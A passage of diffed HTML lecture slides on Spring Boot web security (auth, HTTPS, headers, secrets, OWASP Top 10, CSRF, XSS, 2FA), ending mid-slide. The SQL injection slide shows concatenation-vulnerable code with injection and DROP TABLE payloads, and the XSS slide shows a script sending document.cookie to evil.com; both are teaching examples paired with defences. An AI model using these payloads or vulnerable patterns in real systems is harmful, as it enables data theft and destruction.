+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@RestController
+@RequestMapping("/api/auth")
+@RequiredArgsConstructor
+public class AuthController {
+
+  private final AuthService authService;
+
+  @PostMapping("/login")
+  public AuthResponse login(
+      @RequestBody LoginRequest req) {
+    return authService.authenticate(req);
+    // { accessToken, refreshToken }
+  }
+
+  @PostMapping("/refresh")
+  public AuthResponse refresh(
+      @RequestBody RefreshRequest req) {
+    return authService.refreshToken(
+      req.getRefreshToken());
+  }
+
+  @PostMapping("/logout")
+  public void logout(
+      @RequestBody RefreshRequest req) {
+    authService.revokeRefreshToken(
+      req.getRefreshToken());
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">19</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>API KEY AUTHENTICATION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>API Key</strong> is used for service-to-service authentication, not user authentication. Suitable for machine clients (third-party integrations).</p>
+        <h3>Characteristics:</h3>
+        <ul>
+          <li>Long, random, unique string</li>
+          <li>Passed via HTTP header (X-API-Key)</li>
+          <li>Can be revoked server-side</li>
+          <li>Has rate limit per key</li>
+          <li>Has scopes/permissions</li>
+        </ul>
+        <h3>Generate API Key:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+public String generateApiKey() {
+  byte[] randomBytes = new byte[32];
+  new SecureRandom().nextBytes(randomBytes);
+  return Base64.getUrlEncoder()
+    .withoutPadding()
+    .encodeToString(randomBytes);
+}
+// E.g.: "Xx1Yy2Zz3..." (43 characters)</pre>
+      </div>
+      <div class="col">
+        <h3>API Key Filter:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Component
+public class ApiKeyFilter
+    extends OncePerRequestFilter {
+
+  @Autowired
+  private ApiKeyService apiKeyService;
+
+  @Override
+  protected void doFilterInternal(
+      HttpServletRequest req,
+      HttpServletResponse res,
+      FilterChain chain)
+      throws ServletException, IOException {
+
+    String apiKey = req.getHeader("X-API-Key");
+
+    if (apiKey != null) {
+      ApiKeyEntity key = apiKeyService
+        .validateAndGet(apiKey);
+      if (key != null && key.isActive()) {
+        UsernamePasswordAuthenticationToken auth =
+          new UsernamePasswordAuthenticationToken(
+            key.getClientName(), null,
+            key.getAuthorities());
+        SecurityContextHolder.getContext()
+          .setAuthentication(auth);
+      }
+    }
+
+    chain.doFilter(req, res);
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">20</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>OAUTH2 — LOGIN WITH GOOGLE/GITHUB</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>OAuth2 Authorization Code Flow</strong> allows users to log in via Google, Facebook, GitHub without exposing their password.</p>
+        <h3>Flow:</h3>
+        <div class="steps">
+          <div class="step"><div class="step-num">1</div><div class="step-content"><h4>Click "Login with Google"</h4><p>App redirects to Google</p></div></div>
+          <div class="step"><div class="step-num" style="background:#ED7D31;">2</div><div class="step-content"><h4>User logs into Google</h4><p>Google verifies, asks for permissions</p></div></div>
+          <div class="step"><div class="step-num" style="background:#70AD47;">3</div><div class="step-content"><h4>Google → Authorization Code</h4><p>Redirects back to app with code</p></div></div>
+          <div class="step"><div class="step-num" style="background:#7030A0;">4</div><div class="step-content"><h4>App exchanges code → Access Token</h4><p>Gets user information</p></div></div>
+        </div>
+      </div>
+      <div class="col">
+        <h3>Spring Boot config:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+spring:
+  security:
+    oauth2:
+      client:
+        registration:
+          google:
+            client-id: ${GOOGLE_CLIENT_ID}
+            client-secret: ${GOOGLE_CLIENT_SECRET}
+            scope:
+              - email
+              - profile
+          github:
+            client-id: ${GITHUB_CLIENT_ID}
+            client-secret: ${GITHUB_CLIENT_SECRET}</pre>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+public class OAuth2Config {
+  @Bean
+  public SecurityFilterChain filterChain(
+      HttpSecurity http) throws Exception {
+    return http
+      .oauth2Login(oauth2 -> oauth2
+        .loginPage("/login")
+        .defaultSuccessUrl("/dashboard"))
+      .build();
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">21</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>HTTPS, SSL/TLS & CERTIFICATES</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>HTTPS</strong> = HTTP + TLS encryption — mandatory for production to protect transmitted data.</p>
+        <h3>Why HTTPS?</h3>
+        <ul>
+          <li><strong>Encryption</strong> — prevents man-in-the-middle attacks</li>
+          <li><strong>Authentication</strong> — verifies server identity</li>
+          <li><strong>Integrity</strong> — prevents data tampering</li>
+          <li><strong>SEO ranking</strong> — Google prioritizes HTTPS</li>
+          <li><strong>HTTP/2 & HTTP/3</strong> — only run on HTTPS</li>
+          <li><strong>Modern browser features</strong> — Service Worker, Geolocation require HTTPS</li>
+        </ul>
+        <h3>Getting SSL certificate:</h3>
+        <ul>
+          <li><strong>Let's Encrypt</strong> — free, auto-renew</li>
+          <li><strong>DigiCert, Sectigo</strong> — commercial CA</li>
+          <li><strong>Self-signed</strong> — for dev only</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Spring Boot HTTPS:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+# Create keystore (dev only)
+keytool -genkeypair -alias myapp \
+  -keyalg RSA -keysize 2048 \
+  -storetype PKCS12 -keystore keystore.p12 \
+  -validity 365
+
+# application.yml
+server:
+  port: 8443
+  ssl:
+    enabled: true
+    key-store: classpath:keystore.p12
+    key-store-password: ${SSL_PASS}
+    key-store-type: PKCS12
+    key-alias: myapp
+    enabled-protocols: TLSv1.2,TLSv1.3</pre>
+        <h3>Force HTTPS redirect:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Bean
+public ServletWebServerFactory servletContainer() {
+  TomcatServletWebServerFactory tomcat =
+    new TomcatServletWebServerFactory() {
+      @Override
+      protected void postProcessContext(
+          Context context) {
+        SecurityConstraint sc =
+          new SecurityConstraint();
+        sc.setUserConstraint("CONFIDENTIAL");
+        // ... redirect HTTP → HTTPS
+      }
+    };
+  return tomcat;
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">22</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>HTTP SECURITY HEADERS</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p>HTTP Headers help browsers protect users from many types of attacks. Spring Security automatically sets some headers, but customization is needed.</p>
+        <table>
+          <thead><tr><th>Header</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Strict-Transport-Security</strong></td><td>Force HTTPS (HSTS)</td></tr>
+            <tr><td><strong>X-Frame-Options</strong></td><td>Prevent clickjacking</td></tr>
+            <tr><td><strong>X-Content-Type-Options</strong></td><td>Prevent MIME sniffing</td></tr>
+            <tr><td><strong>Content-Security-Policy</strong></td><td>Prevent XSS, data injection</td></tr>
+            <tr><td><strong>Referrer-Policy</strong></td><td>Control Referer header</td></tr>
+            <tr><td><strong>Permissions-Policy</strong></td><td>Allow/deny browser features</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="col">
+        <h3>Spring Security configuration:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+http
+  .headers(headers -> headers
+    // Force HTTPS for 1 year
+    .httpStrictTransportSecurity(hsts -> hsts
+      .maxAgeInSeconds(31536000)
+      .includeSubDomains(true))
+
+    // Prevent clickjacking
+    .frameOptions(frame -> frame.deny())
+
+    // Prevent MIME sniffing
+    .contentTypeOptions(Customizer.withDefaults())
+
+    // CSP
+    .contentSecurityPolicy(csp -> csp
+      .policyDirectives(
+        "default-src 'self'; " +
+        "script-src 'self'; " +
+        "style-src 'self' 'unsafe-inline'; " +
+        "img-src 'self' data: https:; " +
+        "frame-ancestors 'none'"))
+
+    // Referrer
+    .referrerPolicy(ref -> ref
+      .policy(ReferrerPolicy
+        .STRICT_ORIGIN_WHEN_CROSS_ORIGIN)));</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">23</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SECRETS MANAGEMENT</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>NEVER</strong> commit secrets (password, API keys, tokens) to Git!</p>
+        <h3>Anti-patterns:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+// ❌ Hardcode in code
+private String dbPassword = "secret123";
+
+// ❌ In committed application.yml
+spring:
+  datasource:
+    password: secret123
+
+// ❌ In committed .env file
+DB_PASSWORD=secret123</pre>
+        <h3>Best practices:</h3>
+        <ul>
+          <li><strong>Environment variables</strong></li>
+          <li><strong>Secrets manager</strong> (Vault, AWS Secrets Manager)</li>
+          <li><strong>.gitignore</strong> .env, *.key files</li>
+          <li><strong>Rotation</strong> on a regular schedule</li>
+          <li><strong>Audit access</strong> who reads secrets</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Spring Boot config:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+# application.yml - use env vars
+spring:
+  datasource:
+    url: ${DB_URL}
+    username: ${DB_USER}
+    password: ${DB_PASS}
+
+jwt:
+  secret: ${JWT_SECRET}
+
+# .env (gitignored)
+DB_URL=jdbc:mysql://localhost:3306/mydb
+DB_USER=root
+DB_PASS=secret123
+JWT_SECRET=very-long-random-string
+
+# Run with env file
+SPRING_PROFILES_ACTIVE=prod \
+  source .env &amp;&amp; java -jar app.jar</pre>
+        <h3>HashiCorp Vault integration:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+spring:
+  cloud:
+    vault:
+      uri: https://vault.cmc.vn:8200
+      token: ${VAULT_TOKEN}
+      kv:
+        enabled: true
+        backend: secret
+        application-name: my-app</pre>
+        <div class="ai-box">
+          <div class="ai-label">&#x2728; MODERN TRENDS</div>
+          <p>Tools like <strong>git-secrets</strong>, <strong>truffleHog</strong> scan repos to detect accidentally committed secrets.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">24</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>DATA ENCRYPTION — SYMMETRIC & ASYMMETRIC</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>2 types of Encryption:</h3>
+        <table class="table-small">
+          <thead><tr><th></th><th>Symmetric</th><th>Asymmetric</th></tr></thead>
+          <tbody>
+            <tr><td>Keys</td><td>1 shared key</td><td>Public + Private key</td></tr>
+            <tr><td>Speed</td><td>Fast</td><td>Slower</td></tr>
+            <tr><td>Use case</td><td>Encrypt large data</td><td>Encrypt small data, signing</td></tr>
+            <tr><td>Algorithms</td><td>AES, ChaCha20</td><td>RSA, ECC</td></tr>
+          </tbody>
+        </table>
+        <h3>Encrypt sensitive fields in DB:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+public class EncryptionService {
+
+  @Value("${encryption.key}")
+  private String secretKey;
+
+  public String encrypt(String plainText) {
+    Cipher cipher = Cipher.getInstance(
+      "AES/GCM/NoPadding");
+    cipher.init(Cipher.ENCRYPT_MODE,
+      getKeyFromString(secretKey));
+    byte[] encrypted = cipher.doFinal(
+      plainText.getBytes());
+    return Base64.getEncoder()
+      .encodeToString(encrypted);
+  }
+}</pre>
+      </div>
+      <div class="col">
+        <h3>JPA Attribute Converter:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Converter
+public class EncryptedStringConverter
+    implements AttributeConverter
+      &lt;String, String&gt; {
+
+  @Autowired
+  private EncryptionService encryptionService;
+
+  @Override
+  public String convertToDatabaseColumn(
+      String plainText) {
+    return encryptionService.encrypt(plainText);
+  }
+
+  @Override
+  public String convertToEntityAttribute(
+      String encrypted) {
+    return encryptionService.decrypt(encrypted);
+  }
+}
+
+@Entity
+public class User {
+  @Convert(converter =
+    EncryptedStringConverter.class)
+  private String ssn;  // Auto encrypt/decrypt
+
+  @Convert(converter =
+    EncryptedStringConverter.class)
+  private String creditCardNumber;
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">25</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>OWASP TOP 10 — MOST DANGEROUS VULNERABILITIES</h2></div>
+  <div class="slide-body">
+    <p><strong>OWASP Top 10</strong> lists the 10 most dangerous web application vulnerabilities, updated every 3-4 years. <a class="ref" href="https://owasp.org/www-project-top-ten/" target="_blank">[OWASP]</a></p>
+    <table>
+      <thead><tr><th style="width:30%">Vulnerability (2021)</th><th style="width:35%">Description</th><th>Prevention</th></tr></thead>
+      <tbody>
+        <tr><td><strong>A01: Broken Access Control</strong></td><td>Users access unauthorized resources</td><td>RBAC, deny by default</td></tr>
+        <tr><td><strong>A02: Cryptographic Failures</strong></td><td>Weak or missing encryption</td><td>BCrypt, TLS 1.3, AES-256</td></tr>
+        <tr><td><strong>A03: Injection</strong></td><td>SQL, NoSQL, OS command injection</td><td>Prepared statements, validation</td></tr>
+        <tr><td><strong>A04: Insecure Design</strong></td><td>Lack of security from the start</td><td>Threat modeling, secure SDLC</td></tr>
+        <tr><td><strong>A05: Security Misconfiguration</strong></td><td>Default credentials, open ports</td><td>Hardening, automated checks</td></tr>
+        <tr><td><strong>A06: Vulnerable Components</strong></td><td>Outdated libraries/frameworks with vulnerabilities</td><td>Dependency check, update</td></tr>
+        <tr><td><strong>A07: Auth Failures</strong></td><td>Weak password, session fixation</td><td>2FA, strong password policy</td></tr>
+        <tr><td><strong>A08: Software Integrity Failures</strong></td><td>Unverified updates, CI/CD compromise</td><td>Signed packages, SBOM</td></tr>
+        <tr><td><strong>A09: Logging Failures</strong></td><td>Insufficient logging to detect attacks</td><td>Audit log, SIEM monitoring</td></tr>
+        <tr><td><strong>A10: SSRF</strong></td><td>Server-Side Request Forgery</td><td>Validate URLs, network segmentation</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <span class="slide-num">26</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SQL INJECTION — EXAMPLES & PREVENTION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3 style="color:#C00000;">❌ Vulnerable code:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+// String concatenation - VERY BAD!
+String email = request.getParameter("email");
+String sql = "SELECT * FROM users WHERE " +
+  "email = '" + email + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(sql);
+
+// Attacker inputs:
+// email = ' OR '1'='1
+// Query becomes:
+// SELECT * FROM users WHERE email = ''
+//   OR '1'='1
+// → Returns ALL users!
+
+// Or even more dangerous:
+// email = '; DROP TABLE users; --
+// → Drops the entire table!</pre>
+      </div>
+      <div class="col">
+        <h3 style="color:#70AD47;">✅ Prevention methods:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+// 1. Prepared Statement
+String sql = "SELECT * FROM users " +
+  "WHERE email = ?";
+PreparedStatement ps =
+  conn.prepareStatement(sql);
+ps.setString(1, email);
+ResultSet rs = ps.executeQuery();
+// Driver automatically escapes special chars
+
+// 2. JPA - automatically safe
+@Query("SELECT u FROM User u " +
+  "WHERE u.email = :email")
+User findByEmail(@Param("email") String email);
+
+// 3. Spring Data - method name
+Optional&lt;User&gt; findByEmail(String email);
+// Automatically generates prepared statement</pre>
+        <h3>Best practices:</h3>
+        <ul>
+          <li>Always use <strong>parameterized queries</strong></li>
+          <li><strong>Validate input</strong> (whitelist format)</li>
+          <li><strong>Least privilege</strong> — DB user should not have DROP</li>
+          <li><strong>WAF</strong> (Web Application Firewall)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">27</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>CSRF — CROSS-SITE REQUEST FORGERY</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>CSRF</strong> — an attacker tricks a user into performing an unintended request (e.g., money transfer) while the user is logged into another website.</p>
+        <h3>Attack method:</h3>
+        <ol>
+          <li>User logs into bank.com</li>
+          <li>User visits evil.com</li>
+          <li>evil.com has a hidden form POSTing to bank.com</li>
+          <li>Browser automatically sends session cookie → bank trusts it → money transferred</li>
+        </ol>
+        <h3>Prevention methods:</h3>
+        <ul>
+          <li><strong>CSRF Token</strong> — random token per session, server verifies each request</li>
+          <li><strong>SameSite Cookie</strong> — only send cookies for same origin</li>
+          <li><strong>Custom headers</strong> — require X-Requested-With</li>
+          <li><strong>Stateless API + JWT</strong> — no CSRF needed (no cookies used)</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Spring Security CSRF:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig {
+
+  @Bean
+  public SecurityFilterChain filterChain(
+      HttpSecurity http) throws Exception {
+    http
+      // Enable CSRF for traditional web apps
+      .csrf(csrf -> csrf
+        .csrfTokenRepository(
+          CookieCsrfTokenRepository
+            .withHttpOnlyFalse()))
+
+      // Or disable for stateless REST API
+      // .csrf(csrf -> csrf.disable())
+
+      .authorizeHttpRequests(...)
+      .build();
+  }
+}</pre>
+        <p style="font-size:13px; color:#666;"><strong>REST API</strong> with JWT typically <strong>disables CSRF</strong> because the token is stored in the header (not an automatic cookie).</p>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">28</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>XSS — CROSS-SITE SCRIPTING</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>XSS</strong> — an attacker injects malicious JavaScript into a web page that runs in the victim's browser.</p>
+        <h3>3 types of XSS:</h3>
+        <table class="table-small">
+          <thead><tr><th>Type</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Stored</strong></td><td>Script stored in DB (comment, profile)</td></tr>
+            <tr><td><strong>Reflected</strong></td><td>Script in URL, server echoes back</td></tr>
+            <tr><td><strong>DOM-based</strong></td><td>Script injected via client-side JS</td></tr>
+          </tbody>
+        </table>
+        <h3>Attack example:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+&lt;!-- User enters a comment --&gt;
+&lt;script&gt;
+  fetch('https://evil.com/steal?cookie=' +
+    document.cookie);
+&lt;/script&gt;</pre>
+      </div>
+      <div class="col">
+        <h3>Prevention methods:</h3>
+        <ul>
+          <li><strong>Output encoding</strong> — escape HTML when rendering</li>
+          <li><strong>Content Security Policy (CSP)</strong> — only allow scripts from trusted domains</li>
+          <li><strong>Validate input</strong> — accept specific formats only</li>
+          <li><strong>HttpOnly cookies</strong> — JS cannot read cookies</li>
+          <li><strong>Sanitize HTML</strong> — use OWASP Java HTML Sanitizer</li>
+        </ul>
+        <h3>Spring Security CSP:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+http
+  .headers(headers -> headers
+    .contentSecurityPolicy(csp -> csp
+      .policyDirectives(
+        "default-src 'self'; " +
+        "script-src 'self' " +
+        "https://trusted.cdn.com; " +
+        "style-src 'self' 'unsafe-inline'"))
+    .xssProtection(xss -> xss
+      .headerValue(XXssProtectionHeaderWriter
+        .HeaderValue.ENABLED_MODE_BLOCK)));</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">29</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>RATE LIMITING — PREVENTING BRUTE FORCE</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>Rate Limiting</strong> limits the number of requests from an IP/user within a time period → prevents brute force, DoS, abuse.</p>
+        <h3>Strategies:</h3>
+        <ul>
+          <li><strong>Fixed Window</strong> — N requests / minute</li>
+          <li><strong>Sliding Window</strong> — more precise</li>
+          <li><strong>Token Bucket</strong> — burst-friendly</li>
+          <li><strong>Leaky Bucket</strong> — smooth rate</li>
+        </ul>
+        <h3>Bucket4j with Spring Boot:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+&lt;dependency&gt;
+  &lt;groupId&gt;com.bucket4j&lt;/groupId&gt;
+  &lt;artifactId&gt;bucket4j-core&lt;/artifactId&gt;
+&lt;/dependency&gt;</pre>
+      </div>
+      <div class="col">
+        <h3>Example: Login rate limit</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Service
+public class RateLimitService {
+
+  private final Map&lt;String, Bucket&gt; cache =
+    new ConcurrentHashMap&lt;&gt;();
+
+  public Bucket resolveBucket(String key) {
+    return cache.computeIfAbsent(key,
+      k -> Bucket.builder()
+        .addLimit(Bandwidth.classic(5,
+          Refill.intervally(5,
+            Duration.ofMinutes(1))))
+        .build());
+  }
+}
+
+@PostMapping("/login")
+public AuthResponse login(
+    @RequestBody LoginRequest req,
+    HttpServletRequest http) {
+  String ip = http.getRemoteAddr();
+  Bucket bucket = rateLimitService
+    .resolveBucket(ip);
+
+  if (!bucket.tryConsume(1)) {
+    throw new TooManyRequestsException(
+      "Try again later");
+  }
+  return authService.authenticate(req);
+}</pre>
+        <div class="ai-box">
+          <div class="ai-label">&#x2728; MODERN TRENDS</div>
+          <p><strong>API Gateway</strong> (Kong, Nginx, AWS API Gateway) typically handles rate limiting at the edge layer.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">30</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>2FA — TWO-FACTOR AUTHENTICATION</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>2FA</strong> requires 2 layers of authentication: <strong>password</strong> + <strong>device</strong> (phone) → reduces 99% of account takeovers.</p>
+        <h3>Methods:</h3>
+        <table class="table-small">
+          <thead><tr><th>Method</th><th>Security</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SMS OTP</strong></td><td>⚠️ Vulnerable to SIM swap</td></tr>
+            <tr><td><strong>Email OTP</strong></td><td>⚠️ Depends on email security</td></tr>
+            <tr><td><strong>TOTP (Google Authenticator)</strong></td><td>✅ Secure</td></tr>
+            <tr><td><strong>Push notification</strong></td><td>✅ Good UX</td></tr>
+            <tr><td><strong>Hardware key (YubiKey)</strong></td><td>✅✅ Strongest</td></tr>
+            <tr><td><strong>Biometric</strong></td><td>✅ Touch/Face ID</td></tr>
+          </tbody>
+        </table>
+        <h3>TOTP Flow:</h3>
+        <ol>
+          <li>User logs in with password</li>
+          <li>Server requests 6-digit OTP</li>
+          <li>App (Google Authenticator) generates OTP</li>
+          <li>Server verifies OTP → grants access</li>
+        </ol>
+      </div>
+      <div class="col">
+        <h3>Implement TOTP:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+&lt;dependency&gt;
+  &lt;groupId&gt;dev.samstevens.totp&lt;/groupId&gt;
+  &lt;artifactId&gt;totp&lt;/artifactId&gt;
+&lt;/dependency&gt;
+
+@Service
+public class TwoFactorService {
+
+  // Generate secret for user
+  public String generateSecret() {
+    return new DefaultSecretGenerator()
+      .generate();
+  }
+
+  // Generate QR code for user to scan
+  public String getQRCodeUri(
+      String secret, String email) {
+    return new QrData.Builder()
+      .label(email)
+      .secret(secret)
+      .issuer("CMC University")
+      .algorithm(HashingAlgorithm.SHA1)
+      .digits(6)
+      .period(30)
+      .build()
+      .getUri();
+  }
+
+  // Verify OTP from user
+  public boolean verifyCode(
+      String secret, String code) {
+    return new DefaultCodeVerifier(
+      new DefaultCodeGenerator(),
+      new SystemTimeProvider())
+      .isValidCode(secret, code);
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">31</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SECURITY TESTING</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Types of testing:</h3>
+        <table>
+          <thead><tr><th>Type</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SAST</strong></td><td>Static Application Security Testing — analyzes source code</td></tr>
+            <tr><td><strong>DAST</strong></td><td>Dynamic — tests running application</td></tr>
+            <tr><td><strong>IAST</strong></td><td>Interactive — combines both</td></tr>
+            <tr><td><strong>SCA</strong></td><td>Software Composition — checks dependencies</td></tr>
+            <tr><td><strong>Penetration Testing</strong></td><td>Manual hacking experiments</td></tr>
+          </tbody>
+        </table>
+        <h3>Popular tools:</h3>
+        <ul>
+          <li><strong>OWASP Dependency Check</strong> — SCA</li>
+          <li><strong>SonarQube</strong> — SAST</li>
+          <li><strong>OWASP ZAP</strong> — DAST</li>
+          <li><strong>Burp Suite</strong> — pen testing</li>
+          <li><strong>Snyk</strong> — vulnerability scanning</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Spring Security test:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@SpringBootTest
+@AutoConfigureMockMvc
+class SecurityTest {
+
+  @Autowired MockMvc mockMvc;
+
+  @Test
+  @WithAnonymousUser
+  void anonymousCannotAccessAdmin() throws Exception {
+    mockMvc.perform(get("/api/admin/users"))
+      .andExpect(status().isUnauthorized());
+  }
+
+  @Test
+  @WithMockUser(roles = "USER")
+  void userCannotAccessAdmin() throws Exception {
+    mockMvc.perform(get("/api/admin/users"))
+      .andExpect(status().isForbidden());
+  }
+
+  @Test
+  @WithMockUser(roles = "ADMIN")
+  void adminCanAccessAdmin() throws Exception {
+    mockMvc.perform(get("/api/admin/users"))
+      .andExpect(status().isOk());
+  }
+
+  @Test
+  void publicEndpointAccessible() throws Exception {
+    mockMvc.perform(get("/api/courses"))
+      .andExpect(status().isOk());
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">32</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>AUDIT LOGGING — TRACKING BEHAVIOR</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <p><strong>Audit Log</strong> records important actions — mandatory for compliance (GDPR, HIPAA, PCI DSS).</p>
+        <h3>What to log:</h3>
+        <ul>
+          <li>Authentication (login, logout, failed)</li>
+          <li>Authorization (access denied)</li>
+          <li>Data changes (CRUD on sensitive data)</li>
+          <li>Admin actions (create user, change role)</li>
+          <li>Security events (brute force, suspicious IP)</li>
+        </ul>
+        <h3>Audit Entity:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Entity
+@Data
+public class AuditLog {
+  @Id @GeneratedValue
+  private Long id;
+  private String username;
